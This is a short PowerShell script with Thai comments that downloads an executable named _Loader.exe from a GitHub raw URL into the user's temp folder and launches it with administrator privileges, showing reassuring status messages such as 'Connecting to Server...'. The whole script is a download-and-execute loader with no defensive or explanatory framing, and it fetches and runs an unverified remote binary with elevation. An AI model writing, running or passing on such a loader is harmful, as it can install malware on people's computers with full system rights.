# แก้บรรทัดที่ 2 ให้เป็นชื่อนี้:
$exeUrl = "https://github.com/lubyralph6-maker/newpower.ps1/raw/main/_Loader.exe"
$outputPath = "$env:TEMP\_Loader.exe"

# ส่วนที่เหลือเหมือนเดิม...
Write-Host "Connecting to Server..." -ForegroundColor Cyan
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($exeUrl, $outputPath)
} catch {
    Write-Host "Download Failed!" -ForegroundColor Red
    pause
    exit
}

if (Test-Path $outputPath) {
    Write-Host "Starting Loader..." -ForegroundColor Green
    Start-Process -FilePath $outputPath -Verb RunAs
} else {
    Write-Host "File not found!" -ForegroundColor Red
    pause
}
